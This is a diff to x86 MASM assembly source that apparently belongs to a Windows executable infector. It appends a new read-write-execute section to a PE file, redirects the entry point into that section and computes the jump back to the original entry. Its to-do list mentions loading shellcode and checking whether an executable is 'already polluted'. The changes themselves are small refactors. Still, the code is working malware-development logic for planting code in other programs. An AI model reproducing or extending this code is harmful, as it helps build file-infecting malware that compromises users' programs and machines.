@@ -13,10 +13,9 @@ includelib	c:\masm32\lib\msvcrt.lib
 
 ;todo:
 ;full english var + comments
-; replace offset by addr when possible or lea
 ;dynamic loadlib shellcode
 ;listing directory
-;non-masm version
+;non-masm version delete key words invoke, ; replace offset by addr when possible or lea, delete keyword proc
 ;check if the exe is already polluted
 
 .data
@@ -293,11 +292,16 @@ add 	[eax], ecx
 assume	ebx: ptr IMAGE_SECTION_HEADER
 
 ;strcpy((char*)notreSection->Name,nomSection);
-push 	offset sectionName
-push	ebx 
-call		crt_strcpy
+push		esi
+push		edi
+mov		ecx, 8 					;len (sectionName)
+mov		esi, offset sectionName		; source
+mov		edi, ebx					; destination
+rep	movsb 
+pop			edi
+pop			esi
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;to test;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
 ;newSection->Misc.VirtualSize = AligneOn(sectionAlignment, sectionSize);
 
 ;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -306,7 +310,6 @@ call		crt_strcpy
 ; invoke	crt_printf, offset patSectionAlignment
 ; invoke	crt_printf, offset patPutInt, sectionAlignment
 ;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
 
 push	sectionSize
 push 	sectionAlignment
@@ -381,8 +384,6 @@ mov	[ebx].PointerToRelocations, 0
 mov	[ebx].PointerToLinenumbers, 0
 mov	[ebx].NumberOfRelocations, 0
 mov	[ebx].NumberOfLinenumbers,  0
-
-
 mov	eax, IMAGE_SCN_MEM_READ
 add		eax, IMAGE_SCN_MEM_WRITE
 add		eax, IMAGE_SCN_MEM_EXECUTE
@@ -409,13 +410,10 @@ mov	 eax, [ebx].VirtualAddress
 mov	ecx, ptrEntryPoint
 mov	[ecx], eax
 
-
-
 ;decalage = oldEntryPoint - ( (ptrEntryPoint + sectionSize) )
 mov	eax, oldEntryPoint
 mov	ecx,  ptrEntryPoint
 mov	ecx, [ecx]
-
 sub		eax, ecx
 sub		eax, sectionSize
 
